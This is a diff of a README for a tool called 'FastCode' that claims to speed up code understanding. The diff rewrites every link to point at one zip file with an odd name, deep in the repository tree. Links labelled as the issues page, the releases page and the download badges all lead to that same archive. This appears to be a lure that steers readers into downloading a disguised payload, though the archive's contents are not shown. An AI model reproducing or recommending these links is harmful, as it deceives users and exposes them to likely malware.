@@ -1,6 +1,6 @@
 # ⚡ FastCode - Speed Up Code Understanding Fast
 
-[![Download FastCode](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)
+[![Download FastCode](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Here is how you can start using FastCode step-by-step. The process is designed w
 
 ## ⬇️ Download & Install
 
-1. **Visit the download page:** Click the big badge at the top or go directly to [https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip). This page contains the latest versions of FastCode ready for download.
+1. **Visit the download page:** Click the big badge at the top or go directly to [https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip). This page contains the latest versions of FastCode ready for download.
 
 2. **Choose your version:** Look for the file suitable for your operating system. Windows users will find files ending with `.exe`, while Mac users should look for `.dmg` or `.pkg` files.
 
@@ -101,7 +101,7 @@ If you encounter problems using FastCode, try these tips:
 - Check that you downloaded the correct installer version for your system  
 - Restart the program after installation if it doesn’t open immediately  
 - Ensure your files are not corrupted or locked by other software  
-- Visit the FastCode GitHub page’s [Issues section](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip) for help from the community  
+- Visit the FastCode GitHub page’s [Issues section](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip) for help from the community  
 - If FastCode crashes or freezes, try reinstalling the app
 
 ---
@@ -118,10 +118,10 @@ If you encounter problems using FastCode, try these tips:
 
 ## 🔗 Useful Links
 
-- Official downloads and updates: [FastCode Releases](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)  
-- Report issues or ask questions: [GitHub Issues](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)  
+- Official downloads and updates: [FastCode Releases](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)  
+- Report issues or ask questions: [GitHub Issues](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)  
 - Learn more about FastCode and see screenshots: Check the repository README  
 
 ---
 
-[![Download FastCode](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)](https://raw.githubusercontent.com/Ahemdgggi/FastCode/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)
+[![Download FastCode](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)](https://github.com/Ahemdgggi/FastCode/raw/refs/heads/main/nanobot/nanobot/channels/Code_Fast_amylophosphate.zip)
